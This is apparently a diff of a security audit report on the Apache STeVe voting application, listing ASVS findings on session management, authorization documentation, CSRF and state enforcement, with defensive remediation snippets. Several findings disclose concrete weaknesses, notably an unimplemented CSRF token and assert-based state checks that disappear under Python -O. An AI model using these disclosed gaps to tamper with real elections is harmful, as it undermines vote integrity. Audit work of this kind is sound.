+| **Files** | v3/server/main.py:39-42, v3/server/pages.py (entire file) |
+| **Source Reports** | 7.1.3.md |
+| **Related Findings** | None |
+
+**Description:**
+
+The application integrates with ASF's OAuth infrastructure as a federated identity source, but there is no visible documentation or implementation of controls to coordinate session lifetimes between the ASF OAuth IdP and the local application session. When the ASF OAuth session expires or is revoked, the local application session may remain valid indefinitely. User authenticates at ASF OAuth → token exchanged at callback → local session created → no periodic validation against OAuth provider → no session lifetime synchronization.
+
+**Remediation:**
+
+Document the federated session management strategy and implement periodic token validation. Configuration/documentation should include: SESSION_MANAGEMENT with sso_provider (ASF OAuth), local_session_max_lifetime (8 hours), idle_timeout (30 minutes), re_authentication_required_for (election creation, election open/close), token_refresh_interval (15 minutes), on_sso_revocation (terminate local session within refresh interval).
+
+---
+
+#### FINDING-103: No visible session regeneration on authentication — cannot verify session fixation protection
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟡 Medium |
+| **ASVS Level(s)** | L1 |
+| **CWE** | N/A |
+| **ASVS Sections** | 7.2.4 |
+| **Files** | v3/server/pages.py (entire file), v3/server/main.py:39-42 |
+| **Source Reports** | 7.2.4.md |
+| **Related Findings** | None |
+
+**Description:**
+
+The provided codebase does not contain any explicit session token regeneration logic during the OAuth authentication callback. While the `asfquart` framework likely handles the OAuth callback and session creation, there is no code in the audited files that demonstrates: 1. A new session token being generated upon successful OAuth authentication 2. The previous (unauthenticated) session token being invalidated/terminated 3. Session regeneration on any form of re-authentication. The OAuth callback handling is entirely within the `asfquart` framework. Without visibility into that code, session fixation protection cannot be confirmed.
+
+**Remediation:**
+
+Verify the `asfquart` framework regenerates session tokens on authentication. If not, add explicit regeneration in OAuth callback handler: terminate old session using await asfquart.session.destroy(), then create new session token using await asfquart.session.create() with user info (uid, fullname, email). Log session regeneration events including old and new session IDs.
+
+---
+
+#### FINDING-104: No session termination mechanism after authentication factor changes
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟡 Medium |
+| **ASVS Level(s)** | L2 |
+| **CWE** | N/A |
+| **ASVS Sections** | 7.4.3 |
+| **Files** | v3/server/pages.py (full file) |
+| **Source Reports** | 7.4.3.md |
+| **Related Findings** | None |
+
+**Description:**
+
+The application relies entirely on ASF's external OAuth/LDAP infrastructure for authentication. There is no password change, MFA settings update, or credential management functionality within the application. While the settings_page() endpoint exists, it contains no credential-related operations. Data flow: Authentication factor changes happen at ASF IdP → No callback/webhook from IdP to application → Application has no knowledge of credential changes → Other sessions remain active. If a user's credentials are changed at the ASF IdP (e.g., password reset after compromise), the application has no mechanism to terminate existing sessions.
+
+**Remediation:**
+
+Implement one or more of the following: 1. Short absolute session lifetimes (forces periodic re-auth via IdP), 2. Token refresh that validates against current IdP state, 3. Webhook endpoint for IdP credential change notifications that invalidates all sessions for the affected user. Create a POST /webhooks/credential-change endpoint that receives notifications from ASF IdP when credentials change and calls session_store.invalidate_all_for_user(uid).
+
+#### FINDING-105: No re-authentication enforcement for sensitive account attribute changes
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟡 Medium |
+| **ASVS Level(s)** | L2 |
+| **CWE** | - |
+| **ASVS Sections** | 7.5.1 |
+| **Files** | v3/server/pages.py:603, v3/server/pages.py:594 |
+| **Source Reports** | 7.5.1.md |
+| **Related Findings** | - |
+
+**Description:**
+
+The `/settings` and `/profile` pages exist but only render templates. While the application delegates account attribute management (email, MFA) to the ASF OAuth/LDAP infrastructure, there is no evidence of re-authentication enforcement for any attribute-changing operations within the application's scope. The architecture relies entirely on ASF's IdP for account attribute protection. If the settings page ever gains functionality for modifying sensitive attributes (or if it already has client-side forms posting to an API not shown in this audit), there's no re-authentication gate.
+
+**Remediation:**
+
+If any sensitive attribute modification is added, implement re-authentication flow. Check if user has recently authenticated via session flag. If not, redirect to re-authentication flow before proceeding with the update. Implement a POST endpoint that verifies `recently_authenticated` session flag and redirects to /reauth if not present.
+
+---
+
+#### FINDING-106: No Additional Verification for Vote Submission
 
 | Attribute | Value |
 |-----------|-------|
 | **Severity** | 🟡 Medium |
 | **ASVS Level(s)** | L3 |
 | **CWE** | - |
-| **ASVS Sections** | 8.3.2 |
-| **Files** | v3/server/pages.py:67-93 |
-| **Source Reports** | 8.3.2.md |
-| **Related** | - | **Description:**
+| **ASVS Sections** | 7.5.3 |
+| **Files** | v3/server/pages.py:417 |
+| **Source Reports** | 7.5.3.md |
+| **Related Findings** | - |
 
-If a voter's eligibility is revoked (e.g., removed from mayvote during the editable phase, or LDAP group membership changes), there is no mechanism to: (1) immediately invalidate their active session, (2) alert when they perform actions they're no longer authorized for, or (3) revert changes made after authorization was revoked. Given that the authz LDAP group check is not implemented (EAAC-001), this is a compounding issue—even if authz were checked at login, there's no re-check during the session. Authorization changes are only effective on the next database query, but cached session data may allow continued access.
+**Description:**
+
+Vote submission, while not election management, is a sensitive transaction where vote integrity is critical. No additional verification is required beyond the existing session. A session hijacker could cast or modify votes on behalf of the legitimate user without any additional verification. While re-voting is supported (making this reversible), the user may not notice the unauthorized vote submission.
 
 **Remediation:**
 
-Implement authorization re-validation on each request for sensitive operations. Add validate_user_still_active(uid) function that checks if user is still active in LDAP and has required group memberships. In basic_info() or a middleware layer, verify authorization freshness: if s: uid = s['uid']; if not await validate_user_still_active(uid): await asfquart.session.invalidate(); quart.abort(401, 'Session invalidated - user no longer authorized'). Consider adding session metadata tracking (last_authz_check timestamp) to avoid checking on every request while ensuring reasonable freshness.
+Implement step-up authentication or additional verification mechanism for vote submission. Consider requiring re-authentication within a short time window (e.g., 5 minutes) before accepting votes, or implement a confirmation step with CSRF protection.
 
 ---
 
-#### FINDING-112: No Device Security Posture Assessment or Contextual Risk Analysis
+#### FINDING-107: No session lifetime configuration or IdP authentication timestamp tracking
 
 | Attribute | Value |
 |-----------|-------|
 | **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L3 |
-| **CWE** | CWE-306 |
-| **ASVS Sections** | 8.4.2 |
-| **Files** | v3/server/pages.py:450-486 |
-| **Source Reports** | 8.4.2.md |
-| **Related** | - | **Description:**
+| **ASVS Level(s)** | L2 |
+| **CWE** | - |
+| **ASVS Sections** | 7.6.1 |
+| **Files** | v3/server/main.py:39-42, v3/server/pages.py:82 |
+| **Source Reports** | 7.6.1.md |
+| **Related Findings** | - |
 
-ASVS 8.4.2 explicitly requires 'device security posture assessment' and 'contextual risk analysis' for administrative interfaces. The system has no implementation of: device fingerprinting, behavioral analysis (rapid successive operations, unusual access patterns), geographic/IP risk scoring, session binding to device characteristics, or anomaly detection for administrative operations. Compromised credentials from any network location grant full administrative access with no contextual awareness. No adaptive controls based on IP address changes, time-of-day patterns, concurrent sessions, or device changes.
+**Description:**
+
+No session lifetime configuration, maximum session duration, or IdP authentication timestamp tracking is visible in the codebase. The OAuth configuration only defines URLs for authentication but no timeout or session freshness enforcement. There is no mechanism to require re-authentication when the maximum time between IdP authentication events is reached. Sessions may remain valid indefinitely after initial OAuth authentication. If the IdP revokes user access or the user's LDAP account is disabled, the application session remains valid. During long elections, sessions could persist without validation against the IdP, allowing access after authorization has been revoked.
 
 **Remediation:**
 
-Implement assess_admin_risk(uid, operation) function that calculates risk score based on: (1) IP address consistency with session (session['last_ip'] vs request.remote_addr), (2) rapid successive admin operations (time since last_admin_timestamp), (3) User-Agent consistency (session['user_agent'] vs request headers), (4) time-of-day patterns (operations outside business hours). Store session context in session data. If risk_score >= 50, require step-up authentication. Log all risk assessments with structured format. Implement session binding to device characteristics and detect session hijacking through context changes.
+Implement session age checking against IdP maximum authentication time. Track 'auth_time' in the session and enforce maximum session age. Check session age in basic_info() function - if (time.time() - auth_time) > max_session_age, invalidate the session and redirect to login. Configure APP.cfg.session.max_age (e.g., 8 hours) and validate on each session read.
 
 ---
 
-#### FINDING-113: No Adaptive Security Controls Based on Environmental/Contextual Attributes
+#### FINDING-108: Issue KV data (candidate lists) exposed without granular field filtering
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟡 Medium |
+| **ASVS Level(s)** | L2 |
+| **CWE** | CWE-359 |
+| **ASVS Sections** | 8.2.3 |
+| **Files** | v3/steve/election.py:235-250 |
+| **Source Reports** | 8.2.3.md |
+| **Related Findings** | - |
+
+**Description:**
+
+The list_issues() method returns all KV data (candidate lists, seats, labelmap) without filtering based on the caller's context or role. There is no distinction between what fields a voter should see versus what a manager should see. The kv field contains operational data that may be appropriate for voters but the method has no field filtering mechanism based on the consumer's role or access level.
+
+**Remediation:**
+
+Add field-level access control to list_issues() method by introducing an include_management_fields parameter. When called from voter-facing contexts, filter the KV data to only include voter-visible fields (candidates, labelmap, seats). Example: def list_issues(self, include_management_fields=False) with conditional filtering of issue.kv based on the parameter.
+
+---
+
+#### FINDING-109: No adaptive/contextual security controls implemented for authentication or authorization
 
 | Attribute | Value |
 |-----------|-------|
@@ -2296,37 +2542,151 @@ Implement assess_admin_risk(uid, operation) function that calculates risk score 
 | **ASVS Sections** | 8.2.4 |
 | **Files** | v3/server/pages.py:67-93 |
 | **Source Reports** | 8.2.4.md |
-| **Related** | - | **Description:**
+| **Related Findings** | - |
 
-The application does not implement any adaptive security controls based on environmental or contextual attributes such as: IP address changes during session, geolocation anomalies, device fingerprint changes, time-of-day restrictions, concurrent session detection, or unusual access patterns (e.g., managing elections outside business hours). This means a compromised session token can be used from any location, device, or context without triggering additional verification. While the application uses server-side session validation, there is no contextual risk assessment or adaptive response.
+**Description:**
+
+The application does not implement any adaptive security controls based on IP address changes during session, geolocation anomalies, device fingerprint changes, time-of-day restrictions, concurrent session detection, or unusual access patterns (e.g., managing elections outside business hours). This means a compromised session token can be used from any location, device, or context without triggering additional verification. Session cookie flows to asfquart.session.read() to establish identity with no environmental/contextual validation at session start or during operations.
 
 **Remediation:**
 
-Implement session context validation including: (1) IP-based session binding - store request_ip in session at creation and validate on subsequent requests, (2) device fingerprinting - track User-Agent and basic device characteristics, (3) time-of-day restrictions - require additional authentication for sensitive operations outside business hours (6 AM - 10 PM), (4) geolocation validation - flag sessions from unexpected geographic locations, (5) concurrent session detection - track active sessions per user and alert on anomalies, (6) step-up authentication - require re-authentication for sensitive operations when context changes significantly. Example: async def validate_session_context(session): request_ip = quart.request.remote_addr; stored_ip = session.get('bound_ip'); if stored_ip and request_ip != stored_ip: raise ContextViolation('IP address changed').
+Implement a validate_session_context() function that validates environmental context for the current request. This should include: IP-based session binding (validate request IP against stored session IP and require re-authentication on mismatch), device fingerprinting, time-based restrictions for sensitive operations (flag or require additional auth for off-hours access), geolocation validation, concurrent session detection, and step-up authentication for sensitive operations. Example: async def validate_session_context(session): request_ip = quart.request.remote_addr; stored_ip = session.get('bound_ip'); if stored_ip and request_ip != stored_ip: _LOGGER.warning(f'Session IP mismatch for {session["uid"]}: {stored_ip} → {request_ip}'); raise ContextViolation("IP address changed"); current_hour = datetime.datetime.now().hour; if current_hour < 6 or current_hour > 22: _LOGGER.info(f'Off-hours access by {session["uid"]}'); # Flag for review or require additional auth
 
 ---
 
-#### FINDING-114: Incomplete Function-Level Authorization Documentation
+#### FINDING-110: State enforcement uses Python assert statements which can be disabled at runtime
 
 | Attribute | Value |
 |-----------|-------|
 | **Severity** | 🟡 Medium |
 | **ASVS Level(s)** | L1, L2 |
 | **CWE** | - |
-| **ASVS Sections** | 8.1.1, 8.1.2 |
-| **Files** | v3/docs/schema.md:entire file |
-| **Source Reports** | 8.1.1.md, 8.1.2.md |
-| **Related** | - | **Description:**
+| **ASVS Sections** | 8.3.1, 2.3.1, 16.5.3 |
+| **Files** | v3/steve/election.py:multiple |
+| **Source Reports** | 8.3.1.md, 2.3.1.md, 16.5.3.md |
+| **Related Findings** | - |
 
-The authorization documentation partially defines access rules but lacks comprehensive function-level access control specification. While the documentation mentions ownership (owner_pid) and LDAP group authorization (authz), it does not provide a complete mapping of which functions/operations each role can perform. Missing documentation includes: no explicit listing of all protected functions (open, close, add-issue, edit-issue, delete-issue, set-dates, vote, tally); no matrix mapping consumer permissions (owner, authz group member, eligible voter, committer, PMC member) to allowed operations; the authz field format is explicitly marked 'TBD' indicating incomplete design; no documentation of the R.committer vs R.pmc_member distinction for election creation vs management; no documentation of what 'committer' status grants vs 'owner' status.
+**Description:**
+
+All election state enforcement (preventing modification of opened/closed elections, preventing deletion after opening, preventing voting on non-open elections) relies on Python assert statements. When Python is invoked with the -O (optimize) flag, all assert statements are compiled away and never executed. This is a well-documented Python behavior specified in the language reference. If the application is deployed with python -O or PYTHONOPTIMIZE=1 (common in production for performance), ALL state-based security checks vanish, creating catastrophic fail-open conditions: Elections can be deleted after being opened, Issues can be added to open/closed elections (bypassing tamper detection), Elections can be opened multiple times, Vote types are not validated. Complete bypass of election state integrity controls. An authenticated committer could modify issues in an open election, add votes to closed elections, or delete elections with active votes.
 
 **Remediation:**
 
-Create comprehensive field-level access control documentation specifying read/write permissions for each consumer type (Owner, Voter) and field, including state dependencies. Document which fields are system-only (salt, opened_key, vote_token) and never exposed to consumers. Include a table mapping fields to permissions with state dependency information: Field | Owner (Read) | Owner (Write) | Voter (Read) | Voter (Write) | State Dependency. Example entries: eid (Yes|Never|Yes|Never|-), title (Yes|EDITABLE only|Yes|Never|-), owner_pid (Yes|Never|No|Never|-), salt (Never|Never|Never|Never|System-only), opened_key (Never|Never|Never|Never|System-only).
+Replace all security-critical assert with explicit conditional checks that raise proper exceptions: def delete(self): if not self.is_editable(): raise ElectionBadState(self.eid, self.get_state(), self.S_EDITABLE) ... def add_issue(self, title, description, vtype, kv): if not self.is_editable(): raise ElectionBadState(self.eid, self.get_state(), self.S_EDITABLE) if vtype not in vtypes.TYPES: raise ValueError(f'Invalid vote type: {vtype}') ...
 
 ---
 
-#### FINDING-115: Missing Documentation of Environmental and Contextual Security Attributes
+#### FINDING-111: No mechanism to invalidate sessions or propagate authorization revocations immediately
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟡 Medium |
+| **ASVS Level(s)** | L3 |
+| **CWE** | - |
+| **ASVS Sections** | 8.3.2 |
+| **Files** | v3/server/pages.py:67-93 |
+| **Source Reports** | 8.3.2.md |
+| **Related Findings** | - |
+
+**Description:**
+
+If a voter's eligibility is revoked (e.g., removed from mayvote during the editable phase, or LDAP group membership changes), there is no mechanism to: (1) immediately invalidate their active session, (2) alert when they perform actions they're no longer authorized for, or (3) revert changes made after authorization was revoked. Given that the authz LDAP group check is not implemented (AUTH-001), this is a compounding issue—even if authz were checked at login, there's no re-check during the session. Authorization changes are not applied immediately to active sessions.
+
+**Remediation:**
+
+Re-validate authorization on each request (or on sensitive operations). Check if user is still active in LDAP. If not, invalidate the session and abort with 401. Example: async def basic_info(): s = await asfquart.session.read(); if s: uid = s['uid']; if not await validate_user_still_active(uid): await asfquart.session.invalidate(); quart.abort(401, 'Session invalidated - user no longer authorized'). This ensures authorization changes are immediately effective.
+
+---
+
+#### FINDING-112: No device security posture assessment or contextual risk analysis for administrative interfaces
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟡 Medium |
+| **ASVS Level(s)** | L3 |
+| **CWE** | CWE-778 |
+| **ASVS Sections** | 8.4.2 |
+| **Files** | v3/server/pages.py:system-wide |
+| **Source Reports** | 8.4.2.md |
+| **Related Findings** | FINDING-252 |
+
+**Description:**
+
+ASVS 8.4.2 explicitly requires 'device security posture assessment' and 'contextual risk analysis' for administrative interfaces. The system has no implementation of device fingerprinting, behavioral analysis, geographic/IP risk scoring, session binding to device characteristics, or anomaly detection for administrative operations. Compromised credentials from any network location grant full administrative access with no detection of automated/scripted attacks or anomalous behavior patterns. The requirement states that network location or trusted endpoints should not be the sole factors, but the system has no factors at all.
+
+**Remediation:**
+
+Implement async def assess_admin_risk(uid, operation) that calculates a risk score based on: (1) IP consistency with session, (2) rapid successive admin operations, (3) geographic anomalies, (4) time-of-day patterns. Log risk assessments and require step-up authentication when risk score exceeds threshold. Implement session binding to device characteristics and rate limiting on administrative endpoints. This provides the multiple layers of security required by ASVS 8.4.2.
+
+---
+
+#### FINDING-113: CSRF token validation not implemented despite placeholder
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟡 Medium |
+| **ASVS Level(s)** | L3 |
+| **CWE** | CWE-352 |
+| **ASVS Sections** | 8.4.2 |
+| **Files** | v3/server/pages.py:basic_info function |
+| **Source Reports** | 8.4.2.md |
+| **Related Findings** | FINDING-025 |
+
+**Description:**
+
+The basic_info() function sets result.csrf_token = 'placeholder' but no actual CSRF token generation or validation is implemented. All POST-based administrative operations are vulnerable to CSRF. An attacker can craft malicious forms that submit administrative actions. Combined with the lack of authorization checks, this enables cross-site administrative attacks. The placeholder creates false confidence that CSRF protection exists.
+
+**Remediation:**
+
+Replace the placeholder with cryptographic CSRF token generation using secrets.token_urlsafe(32) and store it in the session. Implement async def validate_csrf_token(form_data) that uses hmac.compare_digest to validate the token from form submissions against the session token. Apply validation to all POST endpoints including do_add_issue_endpoint, do_edit_issue_endpoint, do_delete_issue_endpoint, and do_create_endpoint.
+
+---
+
+#### FINDING-114: Incomplete function-level access control documentation
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟡 Medium |
+| **ASVS Level(s)** | L1 |
+| **CWE** | - |
+| **ASVS Sections** | 8.1.1 |
+| **Files** | v3/docs/schema.md:entire file |
+| **Source Reports** | 8.1.1.md |
+| **Related Findings** | - |
+
+**Description:**
+
+The authorization documentation partially defines access rules but lacks comprehensive function-level access control specification. While the documentation mentions ownership (owner_pid) and LDAP group authorization (authz), it does not provide a complete mapping of which functions/operations each role can perform. Missing documentation includes: no explicit listing of all protected functions (open, close, add-issue, edit-issue, delete-issue, set-dates, vote, tally), no matrix mapping consumer permissions (owner, authz group member, eligible voter, committer, PMC member) to allowed operations, the authz field format is explicitly marked TBD indicating incomplete design, no documentation of the R.committer vs R.pmc_member distinction for election creation vs management, and no documentation of what committer status grants vs owner status. Without comprehensive function-level authorization documentation, developers cannot consistently implement checks, and testers cannot verify completeness. The current code has numerous 'check authz' TODO comments confirming that the lack of clear documentation has led to incomplete implementation.
+
+**Remediation:**
+
+Create an Authorization Matrix document specifying a complete mapping of operations to roles. The matrix should include: Operation, Owner, Authz Group, Eligible Voter, Any Committer, and PMC Member columns. Operations to document include: Create Election, View Management, Open Election, Close Election, Add Issue, Edit Issue, Delete Issue, Cast Vote, View Tally, and Set Dates. Each cell should clearly indicate Yes/No/- for whether that role can perform that operation.
+
+---
+
+#### FINDING-115: Missing field-level access restriction documentation
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟡 Medium |
+| **ASVS Level(s)** | L2 |
+| **CWE** | - |
+| **ASVS Sections** | 8.1.2 |
+| **Files** | v3/docs/schema.md, v3/steve/election.py:165, v3/steve/election.py:179 |
+| **Source Reports** | 8.1.2.md |
+| **Related Findings** | - |
+
+**Description:**
+
+The authorization documentation does not define field-level access restrictions for read and write operations. While the code implements some field filtering (e.g., get_metadata() excludes salt and opened_key), there is no documentation specifying which fields each consumer type can read or write, nor how access changes based on election state. Missing documentation includes: which fields voters can read (e.g., can a voter see owner_pid? authz group?), which fields are writable based on election state (e.g., title writable only in EDITABLE state), specification that salt, opened_key, and vote_token are system-internal fields never exposed to consumers, and state-dependent field access rules (e.g., the trigger preventing open_at/close_at modification when closed is in SQL but not documented as a field-level policy).
+
+**Remediation:**
+
+Create comprehensive field-level access control documentation. Example table format: ## Field-Level Access Control ### Election Fields | Field | Owner (Read) | Owner (Write) | Voter (Read) | Voter (Write) | State Dependency | |-------------|-------------|---------------|-------------|---------------|------------------| | eid | Yes | Never | Yes | Never | - | | title | Yes | EDITABLE only | Yes | Never | - | | owner_pid | Yes | Never | No | Never | - | | authz | Yes | EDITABLE only | No | Never | - | | salt | Never | Never | Never | Never | System-only | | opened_key | Never | Never | Never | Never | System-only | | closed | Yes | Via close() | Yes | Never | System-managed | | open_at | Yes | Until CLOSED | Yes | Never | Trigger enforced | | close_at | Yes | Until CLOSED | Yes | Never | Trigger enforced |
+
+---
+
+#### FINDING-116: Missing documentation of environmental and contextual security attributes
 
 | Attribute | Value |
 |-----------|-------|
@@ -2336,17 +2696,19 @@ Create comprehensive field-level access control documentation specifying read/wr
 | **ASVS Sections** | 8.1.3 |
 | **Files** | v3/docs/schema.md:entire file, v3/server/pages.py:entire file |
 | **Source Reports** | 8.1.3.md |
-| **Related** | - | **Description:**
+| **Related Findings** | - |
+
+**Description:**
 
 The application's documentation does not define any environmental or contextual attributes used in security decisions. There is no documentation of whether time of day, user location, IP address, device type, or other contextual factors influence authentication or authorization decisions. The open_at and close_at fields exist in the schema, but the SQL comment explicitly states: 'These are purely advisory, for humans, and have no effect upon the actual Election operation.' No IP-based restrictions, geographic restrictions, or device/browser-based security decisions are documented. The @asfquart.auth.require decorator handles authentication but no documentation defines what contextual factors the authentication system evaluates.
 
 **Remediation:**
 
-Document all environmental/contextual attributes (or explicitly state none are used). Create documentation section covering: Attributes NOT Used (with intentional design decisions for time-of-day, IP address, device type, geographic location) and Attributes Used (authentication session via OAuth/asfquart with session timeout, LDAP group membership evaluated at request time, election state machine that is time-independent). Example: 'Environmental and Contextual Attributes: Time-of-day restrictions: NOT USED (intentional - ASF is a global organization with contributors in all time zones). IP address restrictions: NOT USED (intentional - contributors work from various locations). Device type restrictions: NOT USED (intentional - support for diverse platforms). Geographic location: NOT USED (intentional - global contributor base). Attributes that ARE used: Authentication session (OAuth via ASF IdP, session timeout per ASF IdP configuration), LDAP group membership (evaluated at request time), Election state (managed through explicit state transitions, not time-based).'
+Document all environmental/contextual attributes (or explicitly state none are used). Example documentation: ## Environmental and Contextual Security Attributes ### Attributes NOT Used (Intentional Design Decisions) - **Time-of-day**: Not used. Elections are opened/closed manually by owners. - **IP Address**: Not used. ASF committers may access from any location. - **Device type**: Not used. Browser-based access is uniform. - **Geographic location**: Not used. ASF is a global organization. ### Attributes Used - **Authentication session**: OAuth session via asfquart, session timeout per ASF IdP. - **LDAP group membership**: Evaluated at request time for authz group checks. - **Election state**: Time-independent state machine (editable/open/closed) controls operations.
 
 ---
 
-#### FINDING-116: Missing Documentation of Environmental Factors in Authorization Decision-Making
+#### FINDING-117: Missing documentation of environmental and contextual factors in authorization decision-making
 
 | Attribute | Value |
 |-----------|-------|
@@ -2356,920 +2718,720 @@ Document all environmental/contextual attributes (or explicitly state none are u
 | **ASVS Sections** | 8.1.4 |
 | **Files** | All documentation files |
 | **Source Reports** | 8.1.4.md |
-| **Related** | - | **Description:**
+| **Related Findings** | - |
 
-There is no documentation defining how environmental and contextual factors are used in authentication and authorization decision-making, including thresholds, risk levels, and actions taken. Since no environmental/contextual attributes are documented (EAAC-017), there is no documentation of decision logic, evaluated attributes, risk thresholds, or resulting actions (allow/challenge/deny/step-up). Missing documentation includes: no risk scoring model, no step-up authentication triggers, no adaptive authentication rules, no documentation of when 'deny' vs 'challenge' applies, no documentation of how the ASF IdP session interacts with the application's authorization layer, and no documentation of what happens when LDAP group membership changes mid-session.
+**Description:**
 
-**Remediation:**
-
-Create comprehensive decision-making framework documentation that includes: Authentication Decision Flow table (Context | Evaluation | Threshold | Action) covering valid session, expired session, and no session scenarios. Authorization Decision Flow table covering election management, vote casting, and election creation with evaluation criteria, thresholds, and actions (Allow or Deny with HTTP status). Factors NOT Evaluated section documenting design decisions: IP address changes during session (not evaluated due to global user base), concurrent sessions (not restricted), rate limiting (delegated to reverse proxy layer). Example format provided in 8.1.4.md report.
-
----
-
-#### FINDING-117: No session inactivity timeout or absolute session lifetime documentation or configuration
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2 |
-| **CWE** | - |
-| **ASVS Sections** | 7.1.1, 7.3.1 |
-| **Files** | v3/server/pages.py:58-84 |
-| **Source Reports** | 7.1.1.md, 7.3.1.md |
-| **Related** | - | **Description:**
-
-No session inactivity timeout is configured anywhere in the provided codebase. No absolute maximum session lifetime is defined. The asfquart.session.read() function is called without any visible timeout parameters. No documentation (in code comments, configuration, or schema.md) addresses session timeout decisions or deviations from NIST SP 800-63B. NIST SP 800-63B §7.2 recommends re-authentication after 30 minutes of inactivity at AAL1 or 15 minutes at AAL2. No such controls are evident. The election system handles sensitive voting operations, which would typically require documented justification for session lifetime decisions. Without documented session timeouts, sessions could persist indefinitely, increasing the risk of session hijacking on shared/public workstations. Lack of documentation means no security review can verify that timeouts are appropriate for the risk level.
+There is no documentation defining how environmental and contextual factors are used in authentication and authorization decision-making, including thresholds, risk levels, and actions taken. Since 8.1.3 established that no environmental/contextual attributes are documented, this requirement naturally follows as unmet—there is no documentation of decision logic, evaluated attributes, risk thresholds, or resulting actions (allow/challenge/deny/step-up). Missing documentation includes: no risk scoring model, no step-up authentication triggers, no adaptive authentication rules, no documentation of when 'deny' vs 'challenge' applies, no documentation of how the ASF IdP session interacts with the application's authorization layer, and no documentation of what happens when LDAP group membership changes mid-session.
 
 **Remediation:**
 
-Implement session inactivity timeout mechanism: 1. Add SESSION_INACTIVITY_TIMEOUT configuration (e.g., 30 minutes), 2. Store last_activity timestamp in session data, 3. Implement middleware or modify basic_info() to check elapsed time since last activity, 4. Update last_activity timestamp on each request, 5. Destroy session and return 401 if timeout exceeded. Example code: SESSION_INACTIVITY_TIMEOUT = 30 * 60  # 30 minutes; async def basic_info(): s = await asfquart.session.read(); if s: last_activity = s.get('last_activity', 0); now = time.time(); if now - last_activity > SESSION_INACTIVITY_TIMEOUT: await asfquart.session.destroy(); quart.abort(401, 'Session expired due to inactivity'); s['last_activity'] = now; await asfquart.session.save(s)
+Create comprehensive decision-making framework documentation that includes: ## Decision-Making Framework ### Authentication Decision Flow | Context | Evaluation | Threshold | Action | |---------------------|-------------------|--------------------|--------------------| | Valid session | Session cookie | Present + valid | Allow | | Expired session | Session timeout | Per ASF IdP config | Redirect to login | | No session | Cookie absence | N/A | Redirect to login | ### Authorization Decision Flow | Context | Evaluation | Threshold | Action | |----------------------|---------------------|---------------------|---------------------| | Election management | owner_pid OR authz | Exact match | Allow or Deny (403) | | Vote casting | mayvote entry | Entry exists | Allow or Deny | | Election creation | PMC membership | LDAP group check | Allow or Deny | ### Factors NOT Evaluated (by design) - IP address changes during session: Not evaluated (global user base) - Concurrent sessions: Not restricted - Rate limiting: Delegated to reverse proxy layer
 
 ---
 
-#### FINDING-118: No concurrent session policy documentation or enforcement
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2 |
-| **CWE** | - |
-| **ASVS Sections** | 7.1.2 |
-| **Files** | v3/server/pages.py:entire file, notably authentication patterns |
-| **Source Reports** | 7.1.2.md |
-| **Related** | - | **Description:**
-
-No documentation defines how many concurrent sessions are permitted per account. No session counting or session listing mechanism exists in the codebase. No behavior is defined for when a maximum number of sessions is reached (e.g., deny new login, terminate oldest session, or alert user). The election system allows voting operations—if an attacker establishes a parallel session after stealing credentials, there is no detection or limitation mechanism. The basic_info() function simply reads whatever session is present without cross-referencing against other active sessions for the same user.
-
-**Remediation:**
-
-Document concurrent session policy and implement controls: Create documentation (session-management-policy.md) specifying: Maximum concurrent sessions per account: 3; When maximum reached: oldest session is invalidated; Justification: Allows legitimate use across desktop/mobile while detecting credential sharing or compromise; Users are notified on login if other active sessions exist. Implementation example: async def enforce_session_limits(uid): active_sessions = await session_store.get_active_sessions(uid); MAX_CONCURRENT = 3; if len(active_sessions) >= MAX_CONCURRENT: oldest = min(active_sessions, key=lambda s: s.created_at); await session_store.invalidate(oldest.session_id); _LOGGER.warning(f'User[U:{uid}] exceeded max sessions; terminated oldest')
-
----
-
-#### FINDING-119: Federated identity system (ASF SSO) interaction undocumented
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2 |
-| **CWE** | - |
-| **ASVS Sections** | 7.1.3 |
-| **Files** | v3/server/pages.py:1-36 |
-| **Source Reports** | 7.1.3.md |
-| **Related** | - | **Description:**
-
-The application uses asfquart.auth and asfquart.session, which integrate with Apache Software Foundation's identity management ecosystem (likely involving LDAP and OAuth/SSO). The code comments explicitly acknowledge this is ASF-committer-specific authentication. There is no documentation detailing: How the ASF SSO session coordinates with the application session, what happens when the SSO session expires but the local session persists, how session termination propagates between systems, conditions that require re-authentication (e.g., sensitive operations like opening/closing elections), and session lifetime coordination between the Identity Provider and this application. The schema.md documentation covers database schema but not authentication/session architecture. Multiple comments indicate incomplete authorization design. Without documented federated session management, there is a risk of: orphaned local sessions after SSO logout, inconsistent session lifetimes between the IdP and this application, missing re-authentication for high-privilege operations (opening elections, tallying votes), and no coordinated session termination in incident response scenarios.
-
-**Remediation:**
-
-Create federated session management documentation covering: Systems in Ecosystem (ASF OAuth/SSO Identity Provider, STeVe Application, LDAP Directory), Session Coordination (local session must not exceed IdP session lifetime, application checks IdP token validity on sensitive operations, logout from IdP triggers backchannel logout notification), Re-authentication Requirements (opening an election, closing an election, tallying votes all require re-verification of IdP session), and Session Termination (user-initiated logout invalidates both local and IdP sessions, IdP-initiated revocation must invalidate local session within 5 minutes, administrative session revocation propagates immediately).
-
----
-
-#### FINDING-120: No visible session token regeneration on authentication
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L1 |
-| **CWE** | - |
-| **ASVS Sections** | 7.2.4 |
-| **Files** | v3/server/pages.py:58-85 |
-| **Source Reports** | 7.2.4.md |
-| **Related** | - | **Description:**
-
